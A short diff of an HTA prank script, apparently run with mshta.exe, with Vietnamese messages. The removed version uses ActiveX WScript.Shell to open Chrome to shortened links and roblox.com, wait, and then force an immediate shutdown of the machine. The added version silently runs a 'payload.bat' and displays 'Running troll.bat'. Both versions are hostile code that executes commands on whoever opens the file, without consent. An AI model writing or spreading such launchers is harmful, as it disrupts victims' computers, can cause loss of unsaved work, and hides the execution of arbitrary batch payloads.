@@ -1,15 +1,16 @@
-<script language="javascript">
-  try {
-    var shell = new ActiveXObject("WScript.Shell");
-    shell.Run("cmd /c start chrome https://tinyurl.com/lookmaxing");
-    shell.Run("cmd /c timeout /t 120 /nobreak");
-    shell.Run("cmd /c start chrome https://tinyurl.com/mrligmaballs");
-    shell.Run("cmd /c timeout /t 120 /nobreak");
-    shell.Run("cmd /c start chrome https://roblox.com");
-    shell.Run("cmd /c timeout /t 60 /nobreak");
-    shell.Run("cmd /c shutdown -s -t 0");
-    window.close();
-  } catch (e) {
-    alert("Không chạy được ActiveX!Phải mở bằng mshta.exe");
-  }
-</script>
+<html>
+<head>
+  <script language="javascript">
+    try {
+      var shell = new ActiveXObject("WScript.Shell");
+      shell.Run("payload.bat");
+      window.close();
+    } catch (e) {
+      alert("Không chạy được ActiveX! Mở bằng mshta.exe");
+    }
+  </script>
+</head>
+<body>
+  <h1>Đang chạy troll.bat...</h1>
+</body>
+</html>
